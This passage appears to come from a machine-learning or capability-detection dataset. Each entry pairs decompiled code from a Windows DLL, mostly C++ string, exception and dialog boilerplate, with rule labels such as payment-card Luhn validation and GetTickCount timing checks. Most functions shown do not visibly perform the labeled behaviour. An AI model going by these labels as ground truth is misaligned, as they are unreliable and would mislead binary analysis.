        "decompiled_code": "\nvoid fcn.1800640f0(uint64_t *arg1, uint64_t *arg2)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    uint64_t arg1_00;\n    uint64_t *puVar5;\n    \n    if (arg1 != arg2) {\n        puVar5 = arg1 + 4;\n        do {\n            uVar2 = *puVar5;\n            if (0xf < uVar2) {\n                uVar3 = puVar5[-3];\n                arg1_00 = uVar3;\n                if (0xfff < uVar2 + 1) {\n                    arg1_00 = *(uVar3 - 8);\n                    if (0x1f < (uVar3 - arg1_00) - 8) {\n                        fcn.1800b3528(uVar3 - arg1_00, uVar2 + 0x28);\n                        pcVar4 = swi(3);\n                        (*pcVar4)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n            }\n            puVar5[-1] = 0;\n            *puVar5 = 0xf;\n            *(puVar5 + -3) = 0;\n            puVar1 = puVar5 + 1;\n            puVar5 = puVar5 + 5;\n        } while (puVar1 != arg2);\n    }\n    return;\n}\n",
        "token_count": 333
    },
    "180064ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.180064ab0(ulong *arg1, ulong *arg2, uint *arg3)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int64_t iVar6;\n    ulong *puVar7;\n    \n    if (arg1 != arg2) {\n        iVar6 = arg3 - arg1;\n        puVar7 = arg1 + 3;\n        do {\n            *(iVar6 + -8 + puVar7) = 0;\n            *(iVar6 + puVar7) = 0;\n            uVar3 = *(puVar7 + -0x14);\n            uVar4 = *(puVar7 + -2);\n            uVar5 = *(puVar7 + -0xc);\n            puVar1 = puVar7 + 5;\n            *arg3 = *(puVar7 + -3);\n            arg3[1] = uVar3;\n            arg3[2] = uVar4;\n            arg3[3] = uVar5;\n            uVar3 = *(puVar7 + -4);\n            uVar4 = *puVar7;\n            uVar5 = *(puVar7 + 4);\n            arg3[4] = *(puVar7 + -1);\n            arg3[5] = uVar3;\n            arg3[6] = uVar4;\n            arg3[7] = uVar5;\n            puVar7[-1] = 0;\n            arg3 = arg3 + 10;\n            *puVar7 = 7;\n            *(puVar7 + -3) = 0;\n            *(iVar6 + -0x20 + puVar1) = *(puVar7 + 1);\n            *(iVar6 + -0x1c + puVar1) = *(puVar7 + 0xc);\n            puVar2 = puVar7 + 2;\n            puVar7 = puVar1;\n        } while (puVar2 != arg2);\n    }\n    fcn.180063f80(arg3, arg3);\n    return arg3;\n}\n",
        "token_count": 466
    },
    "180064b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180064b40(ulong *arg1, ulong *arg2, uint *arg3)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint *puVar7;\n    ulong *puVar8;\n    \n    if (arg1 != arg2) {\n        puVar7 = arg3;\n        puVar8 = arg1 + 7;\n        do {\n            *(puVar8 + arg3 + (-0x28 - arg1)) = 0;\n            *(puVar8 + arg3 + (-0x20 - arg1)) = 0;\n            uVar4 = *(puVar8 + -0x34);\n            uVar5 = *(puVar8 + -6);\n            uVar6 = *(puVar8 + -0x2c);\n            puVar2 = puVar8 + 0x11;\n            *puVar7 = *(puVar8 + -7);\n            puVar7[1] = uVar4;\n            puVar7[2] = uVar5;\n            puVar7[3] = uVar6;\n            uVar4 = *(puVar8 + -0x24);\n            uVar5 = *(puVar8 + -4);\n            uVar6 = *(puVar8 + -0x1c);\n            puVar7[4] = *(puVar8 + -5);\n            puVar7[5] = uVar4;\n            puVar7[6] = uVar5;\n            puVar7[7] = uVar6;\n            puVar8[-5] = 0;\n            puVar7 = puVar7 + 0x22;\n            puVar8[-4] = 7;\n            *(puVar8 + -7) = 0;\n            *(arg3 + (-0x90 - arg1) + puVar2) = 0;\n            *(arg3 + (-0x88 - arg1) + puVar2) = 0;\n            uVar4 = *(puVar8 + -0x14);\n            uVar5 = *(puVar8 + -2);\n            uVar6 = *(puVar8 + -0xc);\n            puVar3 = puVar8 + arg3 + (-0x18 - arg1);\n            *puVar3 = *(puVar8 + -3);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            uVar4 = *(puVar8 + -4);\n            uVar5 = *puVar8;\n            uVar6 = *(puVar8 + 4);\n            puVar3 = puVar8 + arg3 + (-8 - arg1);\n            *puVar3 = *(puVar8 + -1);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            puVar8[-1] = 0;\n            *puVar8 = 0xf;\n            *(puVar8 + -3) = 0;\n            *(puVar8 + arg3 + (0x18 - arg1)) = 0;\n            *(puVar8 + arg3 + (0x20 - arg1)) = 0;\n            uVar4 = *(puVar8 + 0xc);\n            uVar5 = *(puVar8 + 2);\n            uVar6 = *(puVar8 + 0x14);\n            puVar3 = puVar8 + arg3 + (8 - arg1);\n            *puVar3 = *(puVar8 + 1);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            uVar4 = *(puVar8 + 0x1c);\n            uVar5 = *(puVar8 + 4);\n            uVar6 = *(puVar8 + 0x24);\n            puVar3 = puVar8 + arg3 + (0x18 - arg1);\n            *puVar3 = *(puVar8 + 3);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            puVar8[3] = 0;\n            puVar8[4] = 0xf;\n            *(puVar8 + 1) = 0;\n            *(puVar8 + arg3 + (0x38 - arg1)) = 0;\n            *(puVar8 + arg3 + (0x40 - arg1)) = 0;\n            uVar4 = *(puVar8 + 0x2c);\n            uVar5 = *(puVar8 + 6);\n            uVar6 = *(puVar8 + 0x34);\n            puVar3 = puVar8 + arg3 + (0x28 - arg1);\n            *puVar3 = *(puVar8 + 5);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            uVar4 = *(puVar8 + 0x3c);\n            uVar5 = *(puVar8 + 8);\n            uVar6 = *(puVar8 + 0x44);\n            puVar3 = puVar8 + arg3 + (0x38 - arg1);\n            *puVar3 = *(puVar8 + 7);\n            puVar3[1] = uVar4;\n            puVar3[2] = uVar5;\n            puVar3[3] = uVar6;\n            puVar8[7] = 0;\n            puVar8[8] = 0xf;\n            *(puVar8 + 5) = 0;\n            *(puVar8 + arg3 + (0x48 - arg1)) = *(puVar8 + 9);\n            puVar1 = puVar8 + 10;\n            puVar8 = puVar2;\n        } while (puVar1 != arg2);\n    }\n    return;\n}\n",
        "token_count": 1373
    },
    "180065cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180065cd0(int64_t *arg1, ulong noname_1, uint64_t arg3)\n\n{\n    uchar uVar1;\n    uint64_t uVar2;\n    uchar *arg2;\n    \n    arg2 = 0x18012a358;\n    uVar2 = arg1[1];\n    if ((uVar2 != 0) && (arg3 != 0)) {\n        do {\n            if (0x3f < uVar2) break;\n            uVar1 = *arg2;\n            arg2 = arg2 + 1;\n            *(uVar2 + 0x10 + arg1) = uVar1;\n            uVar2 = arg1[1] + 1;\n            arg1[1] = uVar2;\n            arg3 = arg3 - 1;\n        } while (arg3 != 0);\n    }\n    if (uVar2 == 0x40) {\n        fcn.1800654e0(arg1, arg1 + 2);\n        *arg1 = *arg1 + 0x40;\n        arg1[1] = 0;\n    }\n    if (arg3 != 0) {\n        if (0x3f < arg3) {\n            uVar2 = arg3 >> 6;\n            arg3 = arg3 + uVar2 * -0x40;\n            do {\n                fcn.1800654e0(arg1, arg2);\n                *arg1 = *arg1 + 0x40;\n                arg2 = arg2 + 0x40;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        for (; arg3 != 0; arg3 = arg3 - 1) {\n            uVar1 = *arg2;\n            arg2 = arg2 + 1;\n            *(arg1 + arg1[1] + 0x10) = uVar1;\n            arg1[1] = arg1[1] + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 451
    },
    "1800678e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1800678e0(code **arg1, ulong arg2)\n\n{\n    uchar auStack72 [32];\n    ulong uStack40;\n    uchar uStack32;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack72;\n    uStack32 = 1;\n    *arg1 = vtable.std::exception.0;\n    *(arg1 + 1) = ZEXT816(0);\n    uStack40 = arg2;\n    fcn.1800adaec(&uStack40, arg1 + 1);\n    *arg1 = vtable.std::runtime_error.0;\n    fcn.18008fb00(uStack24 ^ auStack72);\n    return;\n}\n",
        "token_count": 162
    },
    "18006795": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180067950(code **arg1)\n\n{\n    uchar auStack72 [32];\n    char *pcStack40;\n    uchar uStack32;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack72;\n    uStack32 = 1;\n    *arg1 = vtable.std::exception.0;\n    pcStack40 = \"bad conversion\";\n    *(arg1 + 1) = ZEXT816(0);\n    fcn.1800adaec(&pcStack40, arg1 + 1);\n    *arg1 = vtable.std::range_error.0;\n    fcn.18008fb00(uStack24 ^ auStack72);\n    return;\n}\n",
        "token_count": 158
    },
    "180067b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180067b20(ulong arg1, ulong *arg2)\n\n{\n    ulong arg1_00;\n    ulong *arg3;\n    uchar auStack136 [128];\n    \n    arg1_00 = fcn.1800687b0(auStack136);\n    arg3 = arg2;\n    if (7 < arg2[3]) {\n        arg3 = *arg2;\n    }\n    fcn.180068c50(arg1_00, arg1, arg3, arg3 + arg2[2] * 2);\n    fcn.1800686c0(auStack136);\n    return arg1;\n}\n",
        "token_count": 140
    },
    "180067d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.180067d90(int64_t arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint8_t in_stack_00000028;\n    uchar auStack248 [32];\n    uint uStack216;\n    uint uStack208;\n    uint uStack200;\n    uint uStack192;\n    int64_t iStack184;\n    ulong uStack176;\n    ulong uStack168;\n    ulong uStack160;\n    uint uStack152;\n    uint uStack148;\n    int64_t iStack144;\n    int64_t iStack136;\n    ulong uStack128;\n    uchar auStack120 [16];\n    int64_t iStack104;\n    ulong uStack96;\n    ulong uStack88;\n    uint64_t uStack72;\n    \n    uStack72 = *0x180123080 ^ auStack248;\n    if (((arg2 != 0) && (arg1 != 0)) && (arg4 != 0)) {\n        iVar1 = (**0x1800de798)();\n        uStack160 = 0;\n        uStack168 = *0x18012a388;\n        uStack176 = 0;\n        uStack192 = 0x80000000;\n        uStack200 = 0x80000000;\n        uStack208 = 0x80000000;\n        uStack216 = 0x80000000;\n        iStack184 = arg1;\n        iVar2 = (**0x1800de618)(0, L\"tooltips_class32\", 0, in_stack_00000028 << 6 | 0x80000001);\n        if ((iVar1 != 0) && (iVar2 != 0)) {\n            uStack128 = 0;\n            auStack120 = ZEXT816(0);\n            uStack96 = 0;\n            uStack88 = 0;\n            uStack152 = 0x48;\n            uStack148 = 0x11;\n            iStack144 = arg1;\n            iStack136 = iVar1;\n            iStack104 = arg4;\n            (**0x1800de7f0)(iVar2, 0x432, 0, &uStack152);\n            (**0x1800de7f0)(iVar2, 0x421, 1, arg3);\n            (**0x1800de7f0)(iVar2, 0x418, 0, 400);\n        }\n    }\n    fcn.18008fb00(uStack72 ^ auStack248);\n    return;\n}\n",
        "token_count": 563
    },
    "180067f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.180067f10(ulong arg1, ulong arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    ushort uStack40;\n    unkbyte6 Stack38;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uVar6 = 0;\n    uVar3 = (**0x1800de650)(0xd);\n    if (uVar3 != 0) {\n        uVar3 = (**0x1800de628)(arg1);\n        if (uVar3 != 0) {\n            iVar4 = (**0x1800de640)(0xd);\n            if (iVar4 != 0) {\n                iVar5 = (**0x1800de0f0)();\n                if (iVar5 != 0) {\n                    uStack24 = *0x180101900;\n                    uStack20 = *0x180101904;\n                    uStack16 = *0x180101908;\n                    uStack12 = *0x18010190c;\n                    uStack40 = 0;\n                    uVar6 = 1;\n                    iVar7 = -1;\n                    do {\n                        iVar7 = iVar7 + 1;\n                    } while (*(iVar5 + iVar7 * 2) != 0);\n                    fcn.180010d70(&uStack40, iVar5, iVar7);\n                    fcn.18000d960(arg2, &uStack40);\n                    if (7 < CONCAT44(uStack12, uStack16)) {\n                        iVar2 = CONCAT62(Stack38, uStack40);\n                        iVar5 = CONCAT44(uStack12, uStack16) * 2;\n                        iVar7 = iVar2;\n                        if (0xfff < iVar5 + 2U) {\n                            iVar7 = *(iVar2 + -8);\n                            if (0x1f < (iVar2 - iVar7) - 8U) {\n                                fcn.1800b3528(iVar7, iVar5 + 0x29);\n                                pcVar1 = swi(3);\n                                uVar3 = (*pcVar1)();\n                                return uVar3;\n                            }\n                        }\n                        fcn.18008fb24(iVar7);\n                    }\n                    (**0x1800de108)(iVar4);\n                }\n                (**0x1800de630)();\n            }\n            return uVar6;\n        }\n    }\n    return uVar3 & 0xffffffffffffff00;\n}\n",
        "token_count": 571
    },
    "18006842": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180068420(ulong arg1, ulong noname_1, int16_t **arg3, ulong arg4)\n\n{\n    int16_t iVar1;\n    uchar auVar2 [16];\n    uint uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    uint in_stack_00000028;\n    uchar in_stack_00000038;\n    uchar auStack168 [32];\n    uchar auStack136 [16];\n    uchar auStack120 [5];\n    uchar auStack115 [7];\n    int16_t aiStack108 [2];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uchar auStack72 [16];\n    ulong uStack56;\n    uint uStack48;\n    uint64_t uStack40;\n    \n    uStack40 = *0x180123080 ^ auStack168;\n    uVar5 = (**0x1800de798)();\n    auStack136 = ZEXT816(0);\n    uStack56 = 0;\n    _auStack120 = ZEXT816(0);\n    uStack48 = 0;\n    auStack104 = ZEXT816(0);\n    auStack88 = ZEXT816(0);\n    auStack72 = ZEXT816(0);\n    if (0x7 < arg3[3]) {\n        arg3 = *arg3;\n    }\n    iVar7 = aiStack108 - arg3;\n    do {\n        iVar1 = *arg3;\n        *(iVar7 + arg3) = iVar1;\n        arg3 = arg3 + 2;\n    } while (iVar1 != 0);\n    uVar6 = (**0x1800de7c0)(arg1);\n    uVar3 = (**0x1800de0d0)(uVar6, 0x5a);\n    iVar4 = (**0x1800de440)(arg4, uVar3, 0x48);\n    auStack136 = CONCAT124(auStack136._4_12_, -iVar4);\n    (**0x1800de5a8)(arg1, uVar6);\n    auVar2 = _auStack120;\n    _auStack120 = CONCAT124(stack0xffffffffffffff8c, in_stack_00000028);\n    _auStack120 = CONCAT115(_auStack115, auStack120) & 0xffffff00ffffffff;\n    uVar6 = (**0x1800de0b8)(auStack136);\n    (**0x1800de7f0)(uVar5, 0x30, uVar6);\n    fcn.18008fb00(uStack40 ^ auStack168);\n    return;\n}\n",
        "token_count": 595
    },
    "18006854": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180068540(void)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong uVar3;\n    uchar auStack152 [32];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uchar auStack72 [16];\n    uchar auStack56 [16];\n    ulong uStack40;\n    uint uStack32;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack152;\n    uVar2 = (**0x1800de798)();\n    auStack120 = ZEXT816(0);\n    uStack40 = 0;\n    auStack104 = ZEXT816(0);\n    uStack32 = 0;\n    auStack88 = ZEXT816(0);\n    auStack72 = ZEXT816(0);\n    auStack56 = ZEXT816(0);\n    uVar3 = (**0x1800de7f0)(uVar2, 0x31, 0, 0);\n    iVar1 = (**0x1800de090)(uVar3, 0x5c, auStack120);\n    if (iVar1 != 0) {\n        auStack104 = CONCAT106(auStack104._6_10_, 400);\n        uVar3 = (**0x1800de0b8)(auStack120);\n        (**0x1800de7f0)(uVar2, 0x30, uVar3);\n    }\n    fcn.18008fb00(uStack24 ^ auStack152);\n    return;\n}\n",
        "token_count": 359
    },
    "18006860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180068600(void)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong uVar3;\n    uchar auStack152 [32];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uchar auStack72 [16];\n    uchar auStack56 [16];\n    ulong uStack40;\n    uint uStack32;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack152;\n    uVar2 = (**0x1800de798)();\n    auStack120 = ZEXT816(0);\n    uStack40 = 0;\n    auStack104 = ZEXT816(0);\n    uStack32 = 0;\n    auStack88 = ZEXT816(0);\n    auStack72 = ZEXT816(0);\n    auStack56 = ZEXT816(0);\n    uVar3 = (**0x1800de7f0)(uVar2, 0x31, 0, 0);\n    iVar1 = (**0x1800de090)(uVar3, 0x5c, auStack120);\n    if (iVar1 != 0) {\n        auStack104 = CONCAT124(auStack104._4_12_, 700);\n        uVar3 = (**0x1800de0b8)(auStack120);\n        (**0x1800de7f0)(uVar2, 0x30, uVar3);\n    }\n    fcn.18008fb00(uStack24 ^ auStack152);\n    return;\n}\n",
        "token_count": 359
    },
    "1800686c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.1800686c0(code **arg1)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    code *pcVar5;\n    \n    *arg1 = \n    vtable.std::wstring_convert_class_std::codecvt_utf8_wchar_t__1114111__0___wchar_t__class_std::allocator_wchar_t___class_std::allocator_char__.0\n    ;\n    if (0x7 < arg1[0xb]) {\n        pcVar1 = arg1[8];\n        iVar3 = arg1[0xb] * 2;\n        pcVar4 = pcVar1;\n        if (0xfff < iVar3 + 2U) {\n            pcVar4 = *(pcVar1 + -8);\n            pcVar5 = iVar3 + 0x29;\n            iVar3 = pcVar1 - pcVar4;\n            if (0x1f < iVar3 - 8U) goto code_r0x00018006879d;\n        }\n        fcn.18008fb24(pcVar4);\n    }\n    arg1[0xb] = 0x7;\n    arg1[10] = NULL;\n    *(arg1 + 8) = 0;\n    pcVar5 = arg1[7];\n    if (0xf < pcVar5) {\n        pcVar1 = arg1[4];\n        pcVar4 = pcVar1;\n        if (0xfff < pcVar5 + 1) {\n            pcVar4 = *(pcVar1 + -8);\n            pcVar5 = pcVar5 + 0x28;\n            iVar3 = pcVar1 - pcVar4;\n            if (0x1f < iVar3 - 8U) {\ncode_r0x00018006879d:\n                fcn.1800b3528(iVar3, pcVar5);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(pcVar4);\n    }\n    arg1[6] = NULL;\n    arg1[7] = 0xf;\n    *(arg1 + 4) = 0;\n    if ((arg1[3] != NULL) && (puVar2 = (**(*arg1[3] + 0x10))(),  puVar2 != NULL)) {\n        (***puVar2)(puVar2, 1);\n    }\n    return;\n}\n",
        "token_count": 542
    },
    "18006958": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.180069580(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    \n    puVar2 = fcn.180020a80();\n    iVar1 = fcn.1800b6248(*puVar2, arg1, arg2, arg3);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 107
    },
    "1800695e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.1800695e0(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint64_t *puVar2;\n    \n    puVar2 = fcn.180020a80();\n    iVar1 = fcn.1800b6240(*puVar2 | 1, arg1, arg2, arg3);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 114
    },
    "18006964": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.180069640(int64_t arg1, uint64_t arg2, int64_t arg3, uint64_t arg4)\n\n{\n    uint *puVar1;\n    \n    if (arg4 == 0) {\n        return 0;\n    }\n    if (arg1 != 0) {\n        if ((arg3 != 0) && (arg4 <= arg2)) {\n            fcn.1800ade80(arg1, arg3, arg4);\n            return 0;\n        }\n        fcn.1800ae290(arg1, 0, arg2);\n        if (arg3 != 0) {\n            if (arg4 <= arg2) {\n                return 0x16;\n            }\n            puVar1 = fcn.1800ba53c(arg1);\n            *puVar1 = 0x22;\n            fcn.1800b3508();\n            return 0x22;\n        }\n    }\n    puVar1 = fcn.1800ba53c(arg1);\n    *puVar1 = 0x16;\n    fcn.1800b3508();\n    return 0x16;\n}\n",
        "token_count": 249
    },
    "18006a3b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18006a3b0(void)\n\n{\n    int64_t iVar1;\n    \n    if (*0x18012b048 == NULL) {\n        iVar1 = (**0x1800de138)(0x1800fecc8);\n        if (((iVar1 == 0) && (*0x18012a350 < 0x20)) && (iVar1 = (**0x1800de140)(),  iVar1 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar1;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b048 = (**0x1800de458)(iVar1, \"InternetCloseHandle\");\n        if (*0x18012b048 == NULL) {\n            *0x18012a340 = 0;\n            *0x18012a348 = 0;\n            *0x18012a380 = 0;\n            return;\n        }\n    }\n    if (*0x18012a348 != 0) {\n        (**0x18012b048)();\n    }\n    if (*0x18012a380 != 0) {\n        (**0x18012b048)();\n    }\n    if (*0x18012a340 != 0) {\n        (**0x18012b048)();\n    }\n    *0x18012a340 = 0;\n    *0x18012a348 = 0;\n    *0x18012a380 = 0;\n    return;\n}\n",
        "token_count": 342
    },
    "18006c5b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18006c5b0(code **arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    code *arg1_00;\n    code *pcVar4;\n    code *pcVar5;\n    \n    *arg1 = vtable.VisualizerPanel.0;\n    if (arg1[0x15] != NULL) {\n        (**0x1800de0a8)();\n    }\n    fcn.18006d4f0(arg1 + 0x2c, arg2);\n    pcVar5 = arg1[0x2b];\n    if (0xf < pcVar5) {\n        pcVar2 = arg1[0x28];\n        arg1_00 = pcVar2;\n        pcVar4 = pcVar5 + 1;\n        if (0xfff < pcVar5 + 1) {\n            arg1_00 = *(pcVar2 + -8);\n            pcVar4 = pcVar5 + 0x28;\n            iVar3 = pcVar2 - arg1_00;\n            if (0x1f < iVar3 - 8U) goto code_r0x00018006c6ca;\n        }\n        pcVar5 = pcVar4;\n        fcn.18008fb24(arg1_00);\n    }\n    arg1[0x2a] = NULL;\n    arg1[0x2b] = 0xf;\n    *(arg1 + 0x28) = 0;\n    fcn.18006d5b0(arg1 + 0x24);\n    fcn.18006d640(arg1 + 0x21, pcVar5);\n    fcn.18006d700(arg1 + 0x1e);\n    pcVar4 = arg1[0x1d];\n    if (0xf < pcVar4) {\n        pcVar5 = arg1[0x1a];\n        pcVar2 = pcVar5;\n        if (0xfff < pcVar4 + 1) {\n            pcVar2 = *(pcVar5 + -8);\n            pcVar4 = pcVar4 + 0x28;\n            iVar3 = pcVar5 - pcVar2;\n            if (0x1f < iVar3 - 8U) {\ncode_r0x00018006c6ca:\n                fcn.1800b3528(iVar3, pcVar4);\n                pcVar5 = swi(3);\n                (*pcVar5)();\n                return;\n            }\n        }\n        fcn.18008fb24(pcVar2);\n    }\n    arg1[0x1c] = NULL;\n    arg1[0x1d] = 0xf;\n    *(arg1 + 0x1a) = 0;\n    if (0x7 < arg1[0xf]) {\n        pcVar5 = arg1[0xc];\n        uVar1 = arg1[0xf] * 2 + 2;\n        pcVar2 = pcVar5;\n        if (0xfff < uVar1) {\n            pcVar2 = *(pcVar5 + -8);\n            iVar3 = pcVar5 - pcVar2;\n            if (0x1f < iVar3 - 8U) goto code_r0x00018006c5a9;\n        }\n        fcn.18008fb24(pcVar2);\n    }\n    arg1[0xf] = 0x7;\n    arg1[0xe] = NULL;\n    *(arg1 + 0xc) = 0;\n    if (0x7 < arg1[0xb]) {\n        pcVar5 = arg1[8];\n        uVar1 = arg1[0xb] * 2 + 2;\n        pcVar2 = pcVar5;\n        if (0xfff < uVar1) {\n            pcVar2 = *(pcVar5 + -8);\n            iVar3 = pcVar5 - pcVar2;\n            if (0x1f < iVar3 - 8U) {\ncode_r0x00018006c5a9:\n                fcn.1800b3528(iVar3, uVar1 + 0x27);\n                pcVar5 = swi(3);\n                (*pcVar5)();\n                return;\n            }\n        }\n        fcn.18008fb24(pcVar2);\n    }\n    arg1[10] = NULL;\n    arg1[0xb] = 0x7;\n    *(arg1 + 8) = 0;\n    *arg1 = vtable.StaticDialog.0;\n    if (arg1[3] != NULL) {\n        (**0x1800de7d8)(arg1[3], 0xffffffeb);\n        (**0x1800de7f0)(arg1[2], 0x7f4, 1, arg1[3]);\n        (**0x1800de680)(arg1[3]);\n    }\n    return;\n}\n",
        "token_count": 1082
    },
    "18006c75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.18006c750(code **arg1)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    code *arg1_00;\n    ulong in_RDX;\n    \n    fcn.18006d430(arg1 + 0x1b, in_RDX);\n    if (0x7 < arg1[0xb]) {\n        pcVar2 = arg1[8];\n        iVar1 = arg1[0xb] * 2;\n        arg1_00 = pcVar2;\n        if (0xfff < iVar1 + 2U) {\n            arg1_00 = *(pcVar2 + -8);\n            if (0x1f < (pcVar2 - arg1_00) - 8U) {\n                fcn.1800b3528(pcVar2 - arg1_00, iVar1 + 0x29);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    arg1[0xb] = 0x7;\n    arg1[10] = NULL;\n    *(arg1 + 8) = 0;\n    *arg1 = vtable.StaticDialog.0;\n    if (arg1[3] == NULL) {\n        return;\n    }\n    (**0x1800de7d8)(arg1[3], 0xffffffeb);\n    (**0x1800de7f0)(arg1[2], 0x7f4, 1, arg1[3]);\n    // WARNING: Could not recover jumptable at 0x00018006c7f5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x1800de680)(arg1[3]);\n    return;\n}\n",
        "token_count": 399
    },
    "18006c85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
